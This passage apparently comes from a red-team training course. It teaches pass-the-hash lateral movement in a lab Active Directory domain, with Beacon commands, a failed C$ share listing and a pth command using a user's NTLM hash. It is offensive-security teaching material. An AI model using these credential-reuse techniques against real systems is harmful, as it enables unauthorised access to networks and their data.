We know from our domain recon that jking is a local administrator on multiple computers via his membership of the Support Engineers domain group.  We also have credential material for this user in the form of an NTLM hash, AES256 hash and a Kerberos TGT.

This chapter will demonstrate different techniques in which we can leverage these credentials and use them to access one of the target computers.  There are also several techniques where we don't need credential material directly, but that take advantage of processes that the user is running on a machine we have elevated access on.
A common way of testing access to a machine is to list the C drive, as this requires local admin privileges to access.

# Pass The Hash 

Pass the hash is a technique that allows you to authenticate to a Windows service using the NTLM hash of a user's password.  It works by starting a new logon session with a fake identity and then replacing the session information with the domain, username and NTLM hash provided.

Beacon has a dedicated pth command which executes Mimikatz in the background.
  This command requires elevated privileges.


First, attempt to list the C$ share of the WEB machine - this will fail because bfarmer is not a local admin there.

beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

Then run the pth command with jking's username and NTLM hash.
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
